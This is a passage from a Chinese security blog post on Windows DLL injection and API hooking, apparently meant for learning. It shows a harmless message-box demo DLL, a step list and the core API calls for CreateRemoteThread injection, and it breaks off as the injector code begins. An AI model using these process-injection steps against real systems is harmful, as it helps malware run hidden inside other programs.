<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Windows DLL 注入和Api HookDLL 注入DLL 注入（DLL Injection）是指将一个外部的动态链接库（DLL）强制加载到目标进程的虚拟地址空间中，并使其代码在目标进程的上下文中执行的技术。 核心原理：Windows 操作系统对进程实施了虚拟内存隔离机制，进程 A 无法直接访问进程 B 的内存。DLL 注入的本质是打破这种隔离，通过操作系统提供的调试 API 或机制，在">
<meta property="og:type" content="article">
<meta property="og:title" content="windows dll注入和api hook">
<meta property="og:url" content="https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/index.html">
<meta property="og:site_name" content="wooo~ Exploooosion&#39;s blog">
<meta property="og:description" content="Windows DLL 注入和Api HookDLL 注入DLL 注入（DLL Injection）是指将一个外部的动态链接库（DLL）强制加载到目标进程的虚拟地址空间中，并使其代码在目标进程的上下文中执行的技术。 核心原理：Windows 操作系统对进程实施了虚拟内存隔离机制，进程 A 无法直接访问进程 B 的内存。DLL 注入的本质是打破这种隔离，通过操作系统提供的调试 API 或机制，在">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-12-windows_dll_injection/1765524982009.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-12-windows_dll_injection/1765532204002.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-12-windows_dll_injection/1765605236779.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-12-windows_dll_injection/1765605309784.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-12-windows_dll_injection/1765616757981.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-12-windows_dll_injection/1765687938486.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-12-windows_dll_injection/1765844966874.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-12-windows_dll_injection/1765845870344.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-12-windows_dll_injection/1765691259175.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-12-windows_dll_injection/1765691304640.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-12-windows_dll_injection/1765691353434.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-12-windows_dll_injection/1765846796434.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-12-windows_dll_injection/1765703026493.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-12-windows_dll_injection/1765856499390.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-12-windows_dll_injection/1765856651291.png">
<meta property="article:published_time" content="2025-12-11T16:00:00.000Z">
<meta property="article:modified_time" content="2026-01-07T08:05:23.736Z">
<meta property="article:author" content="Exploooosion">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://exploo0osion.github.io/image/2025-12-12-windows_dll_injection/1765524982009.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>windows dll注入和api hook</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 8.1.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/friends/">friends</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/12/30/2025-12-30-learning_windows_4/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/&text=windows dll注入和api hook"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/&title=windows dll注入和api hook"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/&is_video=false&description=windows dll注入和api hook"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=windows dll注入和api hook&body=Check out this article: https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/&title=windows dll注入和api hook"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/&title=windows dll注入和api hook"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/&title=windows dll注入和api hook"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/&title=windows dll注入和api hook"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/&name=windows dll注入和api hook&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/&t=windows dll注入和api hook"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-DLL-%E6%B3%A8%E5%85%A5%E5%92%8CApi-Hook"><span class="toc-number">1.</span> <span class="toc-text">Windows DLL 注入和Api Hook</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DLL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">DLL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%8F%E5%85%B8%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5-Classic-CreateRemoteThread"><span class="toc-number">1.1.1.</span> <span class="toc-text">经典远程线程注入 (Classic CreateRemoteThread)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">技术原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%E4%B8%8E%E6%B5%81%E7%A8%8B-%E5%8F%82%E8%80%83-classicdllinjection-c"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">实现方法与流程 (参考 classicdllinjection.c)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-%E6%A0%B8%E5%BF%83-API-%E5%8F%8A%E4%BD%9C%E7%94%A8"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">1.3 核心 API 及作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">1.4 攻击效果</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4-Session-0-%E9%9A%94%E7%A6%BB%E6%B3%A8%E5%85%A5-Session-0-Bypass"><span class="toc-number">1.1.2.</span> <span class="toc-text">突破 Session 0 隔离注入 (Session 0 Bypass)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">技术原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%E4%B8%8E%E6%B5%81%E7%A8%8B-%E5%8F%82%E8%80%83-session0bypass-c"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">实现方法与流程 (参考 session0bypass.c)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83-API-%E5%8F%8A%E4%BD%9C%E7%94%A8"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">核心 API 及作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C-%E6%9C%80%E5%8E%89%E5%AE%B3%E7%9A%84%E6%95%88%E6%9E%9C"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">攻击效果 (最厉害的效果)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5-Registry-Modification"><span class="toc-number">1.1.3.</span> <span class="toc-text">注册表注入 (Registry Modification)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">技术原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">实现方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83-API-%E5%8F%8A%E4%BD%9C%E7%94%A8-1"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">核心 API 及作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">攻击效果</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5-SetWindowsHookEx"><span class="toc-number">1.1.4.</span> <span class="toc-text">消息钩子注入 (SetWindowsHookEx)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86-3"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">技术原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%E4%B8%8E%E6%B5%81%E7%A8%8B-%E5%8F%82%E8%80%83-hookinjection-c-GlobalHookDll-c"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">实现方法与流程 (参考 hookinjection.c, GlobalHookDll.c)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83-API-%E5%8F%8A%E4%BD%9C%E7%94%A8-2"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">核心 API 及作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C-1"><span class="toc-number">1.1.4.4.</span> <span class="toc-text">攻击效果</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#APC-%E6%B3%A8%E5%85%A5-QueueUserAPC"><span class="toc-number">1.1.5.</span> <span class="toc-text">APC 注入 (QueueUserAPC)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86-4"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">技术原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%E4%B8%8E%E6%B5%81%E7%A8%8B-%E5%8F%82%E8%80%83-ApcInjector-c"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">实现方法与流程 (参考 ApcInjector.c)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83-API-%E5%8F%8A%E4%BD%9C%E7%94%A8-3"><span class="toc-number">1.1.5.3.</span> <span class="toc-text">核心 API 及作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C-2"><span class="toc-number">1.1.5.4.</span> <span class="toc-text">攻击效果</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dll%E5%8A%AB%E6%8C%81"><span class="toc-number">1.2.</span> <span class="toc-text">dll劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dll%E6%90%9C%E7%B4%A2%E9%A1%BA%E5%BA%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">dll搜索顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">实现方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C-3"><span class="toc-number">1.2.3.</span> <span class="toc-text">攻击效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-hook-R3"><span class="toc-number">1.3.</span> <span class="toc-text">windows hook-R3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%9A%84-Hook-IAT-Hook"><span class="toc-number">1.3.1.</span> <span class="toc-text">基于导入表的 Hook (IAT Hook)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95-2"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">实现方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C-4"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">攻击效果</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E7%9A%84%E5%86%85%E8%81%94-Hook-Inline-Hook"><span class="toc-number">1.3.2.</span> <span class="toc-text">基于代码的内联 Hook (Inline Hook)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95-3"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">实现方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%AD%E8%A1%A5%E4%B8%81-Hook-HotFix-Hook"><span class="toc-number">1.3.3.</span> <span class="toc-text">热补丁 Hook (HotFix Hook)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6%E6%96%AD%E7%82%B9-Hook-Int-3-Hook"><span class="toc-number">1.3.4.</span> <span class="toc-text">软件断点 Hook (Int 3 Hook)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95-4"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">实现方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C-5"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">攻击效果</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9-Hook-Hardware-Hook"><span class="toc-number">1.3.5.</span> <span class="toc-text">硬件断点 Hook (Hardware Hook)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95-5"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">实现方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C-6"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">攻击效果</span></a></li></ol></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        windows dll注入和api hook
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Exploooosion</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-12-11T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-12-12</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/windows/">windows</a>
    </div>


      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <span id="more"></span>

<h1 id="Windows-DLL-注入和Api-Hook"><a href="#Windows-DLL-注入和Api-Hook" class="headerlink" title="Windows DLL 注入和Api Hook"></a>Windows DLL 注入和Api Hook</h1><h2 id="DLL-注入"><a href="#DLL-注入" class="headerlink" title="DLL 注入"></a>DLL 注入</h2><p>DLL 注入（DLL Injection）是指将一个外部的动态链接库（DLL）强制加载到目标进程的虚拟地址空间中，并使其代码在目标进程的上下文中执行的技术。</p>
<p><strong>核心原理：</strong><br>Windows 操作系统对进程实施了<strong>虚拟内存隔离</strong>机制，进程 A 无法直接访问进程 B 的内存。DLL 注入的本质是打破这种隔离，通过操作系统提供的调试 API 或机制，在目标进程的内存中写入恶意 DLL 的路径，并操纵目标进程的主动加载行为（通常是强制调用 <code>LoadLibrary</code> API），从而使恶意 DLL 成为目标进程的一部分。</p>
<p>一旦注入成功，DLL 将拥有与目标进程相同的权限（Process Token），能够访问其内存数据、挂钩 API 或作为跳板进行持久化攻击。</p>
<p><code>MessageBoxDll.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RUN_SUCESS 0</span></span><br><span class="line">__declspec(dllexport) <span class="type">int</span> __cdecl <span class="title function_">DownLoadFileFromUrl</span><span class="params">(<span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">&quot;Start Exploooosion&quot;</span>), TEXT(<span class="string">&quot;Hacked&quot;</span>), MB_OK);</span><br><span class="line">          <span class="keyword">return</span> RUN_SUCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(i==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">&quot;Stop Exploooosion&quot;</span>), TEXT(<span class="string">&quot;Hacked&quot;</span>), MB_OK);</span><br><span class="line">          <span class="keyword">return</span> RUN_SUCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> (fdwReason)</span><br><span class="line">  &#123; </span><br><span class="line">    <span class="comment">// 将dll文件附加到进程（加载到地址空间时）。</span></span><br><span class="line">      <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">          DownLoadFileFromUrl(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 在进程中创建了新线程之后会执行。</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 进程中的线程退出时，执行的函数。</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 当dll从进程空间脱离（退出）时执行的进程。</span></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        DownLoadFileFromUrl(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="经典远程线程注入-Classic-CreateRemoteThread"><a href="#经典远程线程注入-Classic-CreateRemoteThread" class="headerlink" title="经典远程线程注入 (Classic CreateRemoteThread)"></a>经典远程线程注入 (Classic CreateRemoteThread)</h3><p>这是最基础也是最通用的注入方式，旨在向普通用户进程注入 DLL。</p>
<h4 id="技术原理"><a href="#技术原理" class="headerlink" title="技术原理"></a>技术原理</h4><p>攻击者进程在目标进程中开辟内存，写入 DLL 路径，然后“远程”命令目标进程创建一个新线程。这个新线程的唯一任务就是执行 <code>LoadLibrary</code> 函数，从而加载指定的 DLL。</p>
<h4 id="实现方法与流程-参考-classicdllinjection-c"><a href="#实现方法与流程-参考-classicdllinjection-c" class="headerlink" title="实现方法与流程 (参考 classicdllinjection.c)"></a>实现方法与流程 (参考 <code>classicdllinjection.c</code>)</h4><ol>
<li><strong>获取权限</strong> ：获取目标进程句柄。</li>
<li><strong>分配内存</strong> ：在目标进程空间中申请一块内存。</li>
<li><strong>写入数据</strong> ：将 DLL 的完整路径写入刚才申请的内存。</li>
<li><strong>地址解析</strong> ：计算 <code>LoadLibraryW</code> 函数在内存中的地址（通常利用 Kernel32.dll 在所有进程中基址相同的特性，或使用 PEB Walking 技术）。</li>
<li><strong>执行注入</strong> ：创建远程线程调用 <code>LoadLibraryW</code>。</li>
</ol>
<h4 id="1-3-核心-API-及作用"><a href="#1-3-核心-API-及作用" class="headerlink" title="1.3 核心 API 及作用"></a>1.3 核心 API 及作用</h4><ul>
<li><code>OpenProcess(PROCESS_ALL_ACCESS, ...)</code>：获取目标进程的操作句柄，需要足够的权限（如 <code>VM_WRITE</code>, <code>VM_OPERATION</code>）。</li>
<li><code>VirtualAllocEx(...)</code>： <strong>关键步骤</strong> 。在<strong>目标进程</strong>的内存空间中分配内存，用于存放 DLL 路径字符串。</li>
<li><code>WriteProcessMemory(...)</code>：将本地的 DLL 路径字符串复制到目标进程刚才分配的内存中。</li>
<li><code>GetRemoteModuleHandle</code> &#x2F; <code>GetProcAddress</code>：获取 <code>LoadLibrary</code> 函数的地址。在你的代码中，使用了更高级的 PEB Walking 技术来查找模块基址。</li>
<li><code>CreateRemoteThread(...)</code>： <strong>核心触发点</strong> 。在目标进程中创建一个新线程，线程的入口点设为 <code>LoadLibrary</code>，参数设为 DLL 路径的内存地址。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span 